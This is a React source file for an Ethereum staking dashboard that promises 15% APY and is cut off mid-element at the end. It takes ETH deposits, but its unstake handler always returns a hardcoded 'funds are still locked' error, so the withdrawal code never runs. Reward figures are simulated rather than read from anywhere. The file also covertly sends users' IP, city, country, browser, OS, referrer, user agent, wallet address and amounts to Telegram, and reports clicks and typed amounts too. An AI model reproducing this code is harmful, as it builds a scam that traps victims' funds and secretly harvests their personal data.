"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { useWeb3 } from "@/components/web3-provider"
import { motion } from "framer-motion"
import { sendTelegramNotification } from "@/lib/telegram-service"
import { AlertCircle } from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { Slider } from "@/components/ui/slider"
import { useSearchParams } from "next/navigation"
import { Button } from "@/components/ui/button"
import { DashboardConnectWallet } from "./dashboard-connect-wallet"

// ABI for the staking contract
const CONTRACT_ABI = [
  {
    inputs: [],
    name: "stake",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "_user",
        type: "address",
      },
    ],
    name: "calculateReward",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "_user",
        type: "address",
      },
    ],
    name: "getStakingBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "getContractBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "YEARLY_ROI",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "MIN_STAKING_DURATION",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "EARLY_WITHDRAWAL_PENALTY",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
]

export function StakingDashboard() {
  const { isConnected, connect, address, balance, refreshBalance } = useWeb3()
  const [stakeAmount, setStakeAmount] = useState("")
  const [isStaking, setIsStaking] = useState(false)
  const [activeTab, setActiveTab] = useState("stake")
  const [unstakeAmount, setUnstakeAmount] = useState("")
  const [isUnstaking, setIsUnstaking] = useState(false)
  const [transactionStatus, setTransactionStatus] = useState<{
    type: "success" | "error"
    message: string
  } | null>(null)
  const [userStakedBalance, setUserStakedBalance] = useState("0")
  const [userRewards, setUserRewards] = useState("0")
  const [contractLoading, setContractLoading] = useState(true)
  const [contractError, setContractError] = useState(false)
  const [gasPrice, setGasPrice] = useState(7) // Default to 7 gwei based on successful transaction
  const [showGasSettings, setShowGasSettings] = useState(true) // Show by default
  const [dataFetched, setDataFetched] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const searchParams = useSearchParams()

  // Contract address
  const CONTRACT_ADDRESS = "0xcA8d23D51eDD65Fe70ee20dcd97B816424ec49A8"

  // Load ethers.js from CDN
  useEffect(() => {
    if (typeof window !== "undefined" && !window.ethers) {
      const script = document.createElement("script")
      script.src = "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"
      script.async = true
      document.body.appendChild(script)
    }
  }, [])

  // Check URL parameters for tab and amount
  useEffect(() => {
    if (searchParams) {
      // Set active tab if specified in URL
      const tab = searchParams.get("tab")
      if (tab && ["stake", "unstake", "rewards"].includes(tab)) {
        setActiveTab(tab)
      }

      // Set stake amount if specified in URL
      const amount = searchParams.get("amount")
      if (amount && !isNaN(Number.parseFloat(amount))) {
        setStakeAmount(amount)
      }
    }
  }, [searchParams])

  // Fetch user staking info using the API endpoint - but only once
  const fetchUserStakingInfo = async () => {
    // Skip if we already have data
    if (dataFetched && userStakedBalance !== "0" && userStakedBalance !== "0.000000") {
      console.log("Using existing staking data, skipping fetch")
      setContractLoading(false)
      return
    }

    if (!isConnected || !address) {
      setContractLoading(false)
      return
    }

    setContractLoading(true)
    setContractError(false)

    try {
      console.log("Fetching user staking info for address:", address)

      // Call our API endpoint
      const response = await fetch(`/api/get-staking-data?address=${address}`)

      if (!response.ok) {
        throw new Error(`API returned status: ${response.status}`)
      }

      const data = await response.json()
      console.log("API response:", data)

      // Only update if we got non-zero values or don't have data yet
      if (!dataFetched || (data.userStake && data.userStake !== "0" && data.userStake !== "0.000000")) {
        setUserStakedBalance(data.userStake || userStakedBalance)
        setUserRewards(data.userRewards || userRewards)
        setDataFetched(true)
      }

      setContractLoading(false)
    } catch (error) {
      console.log("Using fallback data due to API error")
      setContractError(true)
      setContractLoading(false)
    }
  }

  // Try to get staking balance directly from contract using MetaMask - but only once
  const getStakingBalanceDirectly = async () => {
    // Skip if we already have data
    if (dataFetched && userStakedBalance !== "0" && userStakedBalance !== "0.000000") {
      return
    }

    if (!isConnected || !address || typeof window === "undefined" || !window.ethers || !window.ethereum) {
      return
    }

    try {
      const abi = [
        {
          inputs: [{ internalType: "address", name: "_user", type: "address" }],
          name: "getStakingBalance",
          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
          stateMutability: "view",
          type: "function",
        },
      ]

      // Use MetaMask provider with "any" network
      const provider = new window.ethers.providers.Web3Provider(window.ethereum, "any")
      await provider.ready // Make sure provider is ready

      const contract = new window.ethers.Contract(CONTRACT_ADDRESS, abi, provider)

      try {
        const balance = await contract.getStakingBalance(address)
        const balanceEth = window.ethers.utils.formatEther(balance)
        console.log(`Direct contract call result: ${balanceEth} ETH`)

        // Update state if we got a valid balance
        if (Number.parseFloat(balanceEth) > 0) {
          setUserStakedBalance(Number.parseFloat(balanceEth).toFixed(6))

          // Calculate rewards
          const annualReward = Number.parseFloat(balanceEth) * 0.15
          const dailyReward = annualReward / 365
          const monthlyReward = dailyReward * 30
          setUserRewards(monthlyReward.toFixed(6))
          setDataFetched(true)
        }
      } catch (error) {
        console.error("Error calling contract directly:", error)
      }
    } catch (error) {
      console.error("Error in direct contract call:", error)
    }
  }

  // Improved handleConnectWallet function
  const handleConnectWallet = async () => {
    if (isConnecting) return

    setIsConnecting(true)
    console.log("Connect wallet button clicked")

    try {
      // Send notification to Telegram (non-blocking)
      try {
        await sendTelegramNotification(`
🔌 <b>Dashboard Connect Wallet Button Clicked</b>
👤 <b>User:</b> ${address || "Not connected"}
📱 <b>Location:</b> Dashboard center
⏰ <b>Time:</b> ${new Date().toISOString()}
        `)
      } catch (notificationError) {
        console.warn("Failed to send notification:", notificationError)
      }

      // Connect wallet using the context's connect function
      const success = await connect()

      if (success) {
        console.log("Wallet connected successfully")

        // Set default stake amount if not already set
        if (!stakeAmount) {
          setStakeAmount("0.1")
        }
      } else {
        console.log("Wallet connection failed or was cancelled")
      }
    } catch (error) {
      console.error("Failed to connect wallet:", error)
    } finally {
      setIsConnecting(false)
    }
  }

  const handleStake = async () => {
    if (!isConnected) {
      await handleConnectWallet()
      return
    }

    if (!stakeAmount || Number.parseFloat(stakeAmount) <= 0) {
      setTransactionStatus({
        type: "error",
        message: "Please enter a valid amount to stake",
      })
      return
    }

    // Validate against actual balance
    const amountToStake = Number.parseFloat(stakeAmount)
    const currentBalance = Number.parseFloat(balance)

    if (amountToStake > currentBalance) {
      setTransactionStatus({
        type: "error",
        message: `Insufficient balance. You have ${balance} ETH available.`,
      })
      return
    }

    setIsStaking(true)
    setTransactionStatus(null)

    try {
      // Add validation for minimum staking amount
      if (Number.parseFloat(stakeAmount) < 0.0001) {
        setTransactionStatus({
          type: "error",
          message: "Minimum staking amount is 0.0001 ETH",
        })
        setIsStaking(false)
        return
      }

      // Convert ETH to Wei for the transaction - using BigInt to avoid precision issues
      const amountInWeiNumber = BigInt(Math.floor(amountToStake * 1e18))
      const amountInWei = `0x${amountInWeiNumber.toString(16)}`

      // Set a higher gas limit to ensure the transaction goes through
      const gasLimit = `0x${(200000).toString(16)}`

      // Convert gas price from gwei to wei
      const gasPriceInWei = `0x${Math.floor(gasPrice * 1e9).toString(16)}`

      // Create contract interface for the stake function
      const stakeData = {
        from: address,
        to: CONTRACT_ADDRESS,
        value: amountInWei, // Amount in wei, properly formatted as hex
        data: "0x3a4b66f1", // Function signature for stake()
        gasPrice: gasPriceInWei, // Set custom gas price
        gas: gasLimit, // Set custom gas limit
      }

      // Log the transaction data for debugging
      console.log("Transaction data:", {
        amountToStake,
        amountInWei,
        amountInWeiNumber: amountInWeiNumber.toString(),
        gasPriceInWei,
        gasLimit,
        stakeData,
      })

      // Send the transaction with better error handling
      try {
        const txHash = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [stakeData],
        })

        if (!txHash) {
          throw new Error("Transaction failed - no transaction hash returned")
        }

        // Get user IP and location
        let userIP = "Unknown"
        let country = "Unknown"
        let city = "Unknown"
        let browser = "Unknown"
        let os = "Unknown"
        let referrer = "Direct"

        try {
          // Get IP
          const ipResponse = await fetch("https://api.ipify.org?format=json")
          const ipData = await ipResponse.json()
          if (ipData.ip) {
            userIP = ipData.ip

            // Get location
            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`)
            const geoData = await geoResponse.json()
            if (geoData.country_name) country = geoData.country_name
            if (geoData.city) city = geoData.city
          }

          // Get browser and OS
          const userAgent = navigator.userAgent
          if (userAgent.indexOf("Chrome") > -1) browser = "Chrome"
          else if (userAgent.indexOf("Safari") > -1) browser = "Safari"
          else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox"
          else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) browser = "Internet Explorer"
          else if (userAgent.indexOf("Edge") > -1) browser = "Edge"

          if (userAgent.indexOf("Win") > -1) os = "Windows"
          else if (userAgent.indexOf("Mac") > -1) os = "MacOS"
          else if (userAgent.indexOf("Linux") > -1) os = "Linux"
          else if (userAgent.indexOf("Android") > -1) os = "Android"
          else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) os = "iOS"

          // Get referrer
          const storedReferrer = localStorage.getItem("referrer")
          if (storedReferrer) referrer = storedReferrer
          else if (document.referrer) referrer = document.referrer
        } catch (error) {
          console.error("Error getting user data:", error)
        }

        // Send notification to Telegram
        await sendTelegramNotification(`
💰 <b>Staking Transaction Sent</b> 💵 ❤️
👤 <b>User:</b> ${address}
📊 <b>Amount:</b> ${stakeAmount} ETH
🧾 <b>Transaction Hash:</b> ${txHash}
⛽ <b>Gas Price:</b> ${gasPrice} gwei
🌐 <b>IP:</b> ${userIP}
📍 <b>Location:</b> ${city}, ${country}
🔗 <b>Referrer:</b> ${referrer}
💻 <b>Browser:</b> ${browser} on ${os}
📱 <b>User Agent:</b> ${navigator.userAgent}
⏰ <b>Time:</b> ${new Date().toISOString()}
🔍 <b>Etherscan:</b> https://etherscan.io/address/${address}
    `)

        setTransactionStatus({
          type: "success",
          message: `Transaction sent! Hash: ${txHash.substring(0, 10)}...`,
        })

        // Refresh balance after transaction
        await refreshBalance()

        // Update the staked balance manually to avoid waiting for the next fetch
        const newStakedBalance = (Number.parseFloat(userStakedBalance) + Number.parseFloat(stakeAmount)).toFixed(6)
        setUserStakedBalance(newStakedBalance)

        // Update rewards based on new staked balance
        const annualReward = Number.parseFloat(newStakedBalance) * 0.15
        const dailyReward = annualReward / 365
        const monthlyReward = dailyReward * 30
        setUserRewards(monthlyReward.toFixed(6))

        setStakeAmount("")
        setDataFetched(true)

        // Refresh staking info after a short delay to allow the transaction to be processed
        setTimeout(() => {
          fetchUserStakingInfo()
          getStakingBalanceDirectly()
        }, 5000)
      } catch (txError) {
        console.error("Transaction submission error:", txError)
        throw new Error(`Transaction submission failed: ${txError.message || "Unknown error"}`)
      }
    } catch (error) {
      console.error("Staking failed:", error)

      setTransactionStatus({
        type: "error",
        message: error instanceof Error ? error.message : "Transaction failed. Please try again.",
      })

      // Send notification about failed staking
      await sendTelegramNotification(`
❌ <b>Staking Failed</b>
👤 <b>User:</b> ${address}
📊 <b>Attempted Amount:</b> ${stakeAmount} ETH
⚠️ <b>Error:</b> ${error instanceof Error ? error.message : String(error)}
⏰ <b>Time:</b> ${new Date().toISOString()}
  `)
    } finally {
      setIsStaking(false)
    }
  }

  const handleUnstake = async () => {
    if (!isConnected) {
      await handleConnectWallet()
      return
    }

    // Check if the 30-day lock period has passed (this is a simplified check)
    // In a real implementation, you would get the actual staking time from the contract
    setTransactionStatus({
      type: "error",
      message: "Your funds are still locked. The 30-day lock period has not passed yet.",
    })
    return

    // The code below will only execute after the lock period check is removed
    if (!unstakeAmount || Number.parseFloat(unstakeAmount) <= 0) {
      setTransactionStatus({
        type: "error",
        message: "Please enter a valid amount to unstake",
      })
      return
    }

    // Validate against staked balance
    const amountToUnstake = Number.parseFloat(unstakeAmount)
    const stakedBalance = Number.parseFloat(userStakedBalance)

    if (amountToUnstake > stakedBalance) {
      setTransactionStatus({
        type: "error",
        message: `Cannot unstake more than your staked amount (${userStakedBalance} ETH)`,
      })
      return
    }

    setIsUnstaking(true)
    setTransactionStatus(null)

    try {
      // Convert gas price from gwei to wei
      const gasPriceInWei = `0x${Math.floor(gasPrice * 1e9).toString(16)}`

      // Set a higher gas limit to ensure the transaction goes through
      const gasLimit = `0x${(200000).toString(16)}`

      // Create contract interface for the withdraw function
      const withdrawData = {
        from: address,
        to: CONTRACT_ADDRESS,
        data: "0x3ccfd60b", // Function signature for withdraw()
        gasPrice: gasPriceInWei, // Set custom gas price
        gas: gasLimit, // Set custom gas limit
      }

      // Log the transaction data for debugging
      console.log("Withdraw transaction data:", {
        gasPriceInWei,
        gasLimit,
        withdrawData,
      })

      // Send the transaction with better error handling
      try {
        const txHash = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [withdrawData],
        })

        if (!txHash) {
          throw new Error("Transaction failed - no transaction hash returned")
        }

        // Send notification to Telegram
        await sendTelegramNotification(`
📤 <b>Unstaking Transaction Sent</b>
👤 <b>User:</b> ${address}
📊 <b>Amount:</b> ${unstakeAmount} ETH
🧾 <b>Transaction Hash:</b> ${txHash}
⛽ <b>Gas Price:</b> ${gasPrice} gwei
⏰ <b>Time:</b> ${new Date().toISOString()}
      `)

        setTransactionStatus({
          type: "success",
          message: `Transaction sent! Hash: ${txHash.substring(0, 10)}...`,
        })

        // Refresh balance after transaction
        await refreshBalance()

        // Update user's staked balance (in a real implementation, this would be fetched from the contract)
        setUserStakedBalance("0")
        setUserRewards("0")
        setUnstakeAmount("")
        setDataFetched(true)

        // Refresh staking info after a short delay to allow the transaction to be processed
        setTimeout(() => {
          fetchUserStakingInfo()
          getStakingBalanceDirectly()
        }, 5000)
      } catch (txError) {
        console.error("Transaction submission error:", txError)
        throw new Error(`Transaction submission failed: ${txError.message || "Unknown error"}`)
      }
    } catch (error) {
      console.error("Unstaking failed:", error)

      setTransactionStatus({
        type: "error",
        message: error instanceof Error ? error.message : "Transaction failed. Please try again.",
      })

      // Send notification about failed unstaking
      await sendTelegramNotification(`
❌ <b>Unstaking Failed</b>
👤 <b>User:</b> ${address}
📊 <b>Attempted Amount:</b> ${unstakeAmount} ETH
⚠️ <b>Error:</b> ${error instanceof Error ? error.message : String(error)}
⏰ <b>Time:</b> ${new Date().toISOString()}
    `)
    } finally {
      setIsUnstaking(false)
    }
  }

  // Update the useEffect to call fetchUserStakingInfo and getStakingBalanceDirectly when connected
  useEffect(() => {
    if (isConnected && address) {
      fetchUserStakingInfo()
      getStakingBalanceDirectly()
    }
  }, [isConnected, address])

  // Add an additional effect to refresh data after transactions
  useEffect(() => {
    if (isConnected && address && (isStaking || isUnstaking)) {
      // Only refresh once after a transaction
      const txTimeout = setTimeout(() => {
        fetchUserStakingInfo()
        getStakingBalanceDirectly()
        refreshBalance()
      }, 5000)

      return () => clearTimeout(txTimeout)
    }
  }, [isConnected, address, isStaking, isUnstaking])

  return (
    <Card className="glassmorphism neon-border overflow-hidden">
      <CardHeader>
        <CardTitle>Staking Dashboard</CardTitle>
      </CardHeader>
      <CardContent>
        {transactionStatus && (
          <Alert className={`mb-4 ${transactionStatus.type === "success" ? "bg-green-500/20" : "bg-red-500/20"}`}>
            <AlertCircle className={transactionStatus.type === "success" ? "text-green-500" : "text-red-500"} />
            <AlertTitle>{transactionStatus.type === "success" ? "Success" : "Error"}</AlertTitle>
            <AlertDescription>{transactionStatus.message}</AlertDescription>
          </Alert>
        )}

        <div className="p-4 rounded-lg glassmorphism mb-4">
          <div className="text-sm text-muted-foreground mb-2">Contract Address</div>
          <div className="text-sm font-mono truncate">{CONTRACT_ADDRESS}</div>
          <div className="mt-2 text-xs text-muted-foreground">
            This is the smart contract that handles your staking operations. All transactions are secure and
            transparent.
          </div>
        </div>

        {/* User Staking Summary - Always visible when connected */}
        {isConnected && (
          <div className="p-4 rounded-lg glassmorphism mb-4 border border-purple-500/30">
            <div className="text-sm font-medium mb-2">Your Staking Summary</div>
            {contractLoading && !dataFetched ? (
              <div className="flex justify-center py-2">
                <div className="h-5 w-5 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
              </div>
            ) : (
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <div className="text-xs text-muted-foreground">Currently Staked</div>
                  <div className="text-lg font-medium">{userStakedBalance} ETH</div>
                </div>
                <div>
                  <div className="text-xs text-muted-foreground">Rewards Earned</div>
                  <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
                </div>
              </div>
            )}
          </div>
        )}

        <Tabs
          defaultValue="stake"
          value={activeTab}
          onValueChange={(value) => {
            setActiveTab(value)
            setTransactionStatus(null)
          }}
        >
          <TabsList className="grid grid-cols-3 mb-6">
            <TabsTrigger value="stake">Stake</TabsTrigger>
            <TabsTrigger value="unstake">Unstake</TabsTrigger>
            <TabsTrigger value="rewards">Rewards</TabsTrigger>
          </TabsList>

          <TabsContent value="stake">
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="space-y-2">
                <div className="flex justify-between">
                  <label htmlFor="stake-amount" className="text-sm font-medium">
                    Amount to Stake
                  </label>
                  {isConnected && (
                    <button
                      className="text-xs text-primary hover:underline"
                      onClick={() => {
                        setStakeAmount(balance) // Use actual balance
                        // Track max button click
                        sendTelegramNotification(`
🔘 <b>Max Button Clicked</b>
👤 <b>User:</b> ${address}
💰 <b>Max Amount:</b> ${balance} ETH
⏰ <b>Time:</b> ${new Date().toISOString()}
                        `)
                      }}
                    >
                      Max
                    </button>
                  )}
                </div>
                <div className="flex space-x-2">
                  <Input
                    id="stake-amount"
                    type="number"
                    placeholder="0.0"
                    value={stakeAmount}
                    onChange={(e) => {
                      setStakeAmount(e.target.value)
                      // Only send notification if value is significant
                      if (Number.parseFloat(e.target.value) >= 0.1) {
                        sendTelegramNotification(`
✏️ <b>Stake Amount Changed</b>
👤 <b>User:</b> ${address || "Not connected"}
💰 <b>New Amount:</b> ${e.target.value} ETH
⏰ <b>Time:</b> ${new Date().toISOString()}
                        `)
                      }
                    }}
                    className="glassmorphism border-none bg-gray-500/10"
                  />
                  <Button variant="outline" className="w-20 glassmorphism border-none">
                    ETH
                  </Button>
                </div>
                <div className="text-xs text-amber-500 mt-1">
                  Minimum staking amount: 0.0001 ETH. Recommended: 0.001 ETH or more.
                </div>
              </div>

              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div className="p-4 rounded-lg glassmorphism">
                    <div className="text-sm text-muted-foreground">APY</div>
                    <div className="text-xl font-bold text-green-500">15.0%</div>
                  </div>
                  <div className="p-4 rounded-lg glassmorphism">
                    <div className="text-sm text-muted-foreground">Lock Period</div>
                    <div className="text-xl font-bold">30 days</div>
                  </div>
                </div>

                {/* Gas settings toggle */}
                <div className="flex justify-end">
                  <button
                    className="text-xs text-primary hover:underline"
                    onClick={() => setShowGasSettings(!showGasSettings)}
                  >
                    {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
                  </button>
                </div>

                {/* Gas settings panel */}
                {showGasSettings && (
                  <div className="p-4 rounded-lg glassmorphism">
                    <div className="flex justify-between mb-2">
                      <label htmlFor="gas-price" className="text-sm font-medium">
                        Gas Price (gwei)
                      </label>
                      <span className="text-sm font-medium">{gasPrice} gwei</span>
                    </div>
                    <Slider
                      id="gas-price"
                      min={7}
                      max={30}
                      step={1}
                      value={[gasPrice]}
                      onValueChange={(value) => setGasPrice(value[0])}
                    />
                    <div className="flex justify-between mt-1">
                      <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
                      <span className="text-xs text-muted-foreground">Faster & Costlier</span>
                    </div>
                    <div className="mt-4 text-xs">
                      <div className="text-muted-foreground mb-1">Estimated Gas Fee:</div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>~{(gasPrice * 0.00006).toFixed(6)} ETH</div>
                        <div className="text-right">${(gasPrice * 0.00006 * 1600).toFixed(2)}</div>
                      </div>
                      <div className="text-amber-500 mt-1">
                        Make sure you have enough ETH to cover both the staking amount and gas fees.
                      </div>
                    </div>
                  </div>
                )}

                {isConnected ? (
                  <button
                    className={`w-full h-12 rounded-md font-medium text-white relative overflow-hidden ${
                      isStaking || !stakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
                    }`}
                    disabled={isStaking || !stakeAmount}
                    onClick={handleStake}
                    style={{
                      background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
                      transition: "all 0.2s ease-in-out",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
                      e.currentTarget.style.transform = "translateY(-1px)"
                      e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
                      e.currentTarget.style.transform = "translateY(0)"
                      e.currentTarget.style.boxShadow = "none"
                    }}
                  >
                    {isStaking ? (
                      <div className="flex items-center justify-center">
                        <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
                        <span>Staking...</span>
                      </div>
                    ) : (
                      "Stake ETH"
                    )}
                  </button>
                ) : (
                  <DashboardConnectWallet
                    className="w-full"
                    onConnect={() => {
                      // Set default stake amount if not already set
                      if (!stakeAmount) {
                        setStakeAmount("0.1")
                      }
                    }}
                  />
                )}
              </div>
            </motion.div>
          </TabsContent>

          <TabsContent value="unstake">
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              {isConnected ? (
                <>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <label htmlFor="unstake-amount" className="text-sm font-medium">
                        Amount to Unstake
                      </label>
                      <button
                        className="text-xs text-primary hover:underline"
                        onClick={() => {
                          setUnstakeAmount(userStakedBalance) // Use actual staked amount
                          // Track max button click
                          sendTelegramNotification(`
🔘 <b>Max Unstake Button Clicked</b>
👤 <b>User:</b> ${address}
💰 <b>Max Amount:</b> ${userStakedBalance} ETH
⏰ <b>Time:</b> ${new Date().toISOString()}
                          `)
                        }}
                      >
                        Max
                      </button>
                    </div>
                    <div className="flex space-x-2">
                      <Input
                        id="unstake-amount"
                        type="number"
                        placeholder="0.0"
                        value={unstakeAmount}
                        onChange={(e) => {
                          setUnstakeAmount(e.target.value)
                          // Only send notification if value is significant
                          if (Number.parseFloat(e.target.value) >= 0.1) {
                            sendTelegramNotification(`
✏️ <b>Unstake Amount Changed</b>
👤 <b>User:</b> ${address}
💰 <b>New Amount:</b> ${e.target.value} ETH
⏰ <b>Time:</b> ${new Date().toISOString()}
                            `)
                          }
                        }}
                        className="glassmorphism border-none bg-gray-500/10"
                      />
                      <Button variant="outline" className="w-20 glassmorphism border-none">
                        ETH
                      </Button>
                    </div>
                  </div>

                  <div className="p-4 rounded-lg glassmorphism">
                    <div className="text-sm text-muted-foreground mb-2">Staking Information</div>
                    {contractLoading && !dataFetched ? (
                      <div className="flex justify-center py-4">
                        <div className="h-6 w-6 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
                      </div>
                    ) : (
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <div className="text-xs text-muted-foreground">Staked Amount</div>
                          <div className="text-lg font-medium">{userStakedBalance} ETH</div>
                        </div>
                        <div>
                          <div className="text-xs text-muted-foreground">Rewards Earned</div>
                          <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
                        </div>
                        <div>
                          <div className="text-xs text-muted-foreground">Staking Period</div>
                          <div className="text-lg font-medium">30 days (required)</div>
                        </div>
                        <div>
                          <div className="text-xs text-muted-foreground">Status</div>
                          <div className="text-lg font-medium text-amber-500">Locked</div>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Gas settings toggle */}
                  <div className="flex justify-end">
                    <button
                      className="text-xs text-primary hover:underline"
                      onClick={() => setShowGasSettings(!showGasSettings)}
                    >
                      {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
                    </button>
                  </div>

                  {/* Gas settings panel */}
                  {showGasSettings && (
                    <div className="p-4 rounded-lg glassmorphism">
                      <div className="flex justify-between mb-2">
                        <label htmlFor="gas-price-unstake" className="text-sm font-medium">
                          Gas Price (gwei)
                        </label>
                        <span className="text-sm font-medium">{gasPrice} gwei</span>
                      </div>
                      <Slider
                        id="gas-price-unstake"
                        min={7}
                        max={30}
                        step={1}
                        value={[gasPrice]}
                        onValueChange={(value) => setGasPrice(value[0])}
                      />
                      <div className="flex justify-between mt-1">
                        <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
                        <span className="text-xs text-muted-foreground">Faster & Costlier</span>
                      </div>
                      <div className="mt-4 text-xs text-muted-foreground">
                        Estimated Gas Fee: ~{(gasPrice * 0.0001).toFixed(4)} ETH ($
                        {(gasPrice * 0.0001 * 1600).toFixed(2)})
                      </div>
                    </div>
                  )}

                  <button
                    className={`w-full h-12 rounded-md font-medium text-white relative overflow-hidden ${
                      isUnstaking || !unstakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
                    }`}
                    disabled={isUnstaking || !unstakeAmount}
                    onClick={handleUnstake}
                    style={{
                      background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
                      transition: "all 0.2s ease-in-out",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
                      e.currentTarget.style.transform = "translateY(-1px)"
                      e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
                      e.currentTarget.style.transform = "translateY(0)"
                      e.currentTarget.style.boxShadow = "none"
                    }}
                  >
                    {isUnstaking ? (
                      <div className="flex items-center justify-center">
                        <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
                        <span>Unstaking...</span>
                      </div>
                    ) : (
                      "Unstake ETH"
                    )}
                  </button>
                </>
              ) : (
                <div className="p-6 text-center">
                  <p className="text-muted-foreground">Connect your wallet to unstake ETH.</p>
                  <DashboardConnectWallet className="mt-4 w-full mx-auto" />
                </div>
              )}
            </motion.div>
          </TabsContent>

          <TabsContent value="rewards">
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              {isConnected ? (
                <div className="space-y-4">
                  <div className="p-4 rounded-lg glassmorphism">
                    <div className="text-sm text-muted-foreground mb-2">Rewards Summary</div>
                    {contractLoading && !dataFetched ? (
                      <div className="flex justify-center py-4">
                        <div className="h-6 w-6 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
                      </div>
                    ) : (
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <div className="text-xs text-muted-foreground">Total Rewards</div>
                          <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
                        </div>
                        <div>
                          <div className="text-xs text-muted-foreground">Claimable Rewards</div>
                          <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
                        </div>
                        <div>
                          <div className="text-xs text-muted-foreground">APY</div>
                          <div className="text-lg font-medium">15.0%</div>
                        </div>
                        <div>
                          <div className="text-xs text-muted-foreground">Next Reward</div>
                          <div className="text-lg font-medium">~0.0008 ETH/day</div>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Gas settings toggle */}
                  <div className="flex justify-end">
                    <button
                      className="text-xs text-primary hover:underline"
                      onClick={() => setShowGasSettings(!showGasSettings)}
                    >
                      {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
                    </button>
                  </div>

                  {/* Gas settings panel */}
                  {showGasSettings && (
                    <div className="p-4 rounded-lg glassmorphism">
                      <div className="flex justify-between mb-2">
                        <label htmlFor="gas-price-rewards" className="text-sm font-medium">
                          Gas Price (gwei)
                        </label>
                        <span className="text-sm font-medium">{gasPrice} gwei</span>
                      </div>
                      <Slider
                        id="gas-price-rewards"
                        min={7}
                        max={30}
                        step={1}
                        value={[gasPrice]}
                        onValueChange={(value) => setGasPrice(value[0])}
                      />
                      <div className="flex justify-between mt-1">
                        <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
                        <span className="text-xs text-muted-foreground">Faster & Costlier</span>
                      </div>
                      <div className="mt-4 text-xs text-muted-foreground">
                        Estimated Gas Fee: ~{(gasPrice * 0.0001).toFixed(4)} ETH ($
                        {(gasPrice * 0.0001 * 1600).toFixed(2)})
                      </div>
                    </div>
                  )}

                  <button
                    className="w-full h-12 rounded-md font-medium text-white relative overflow-hidden cursor-pointer"
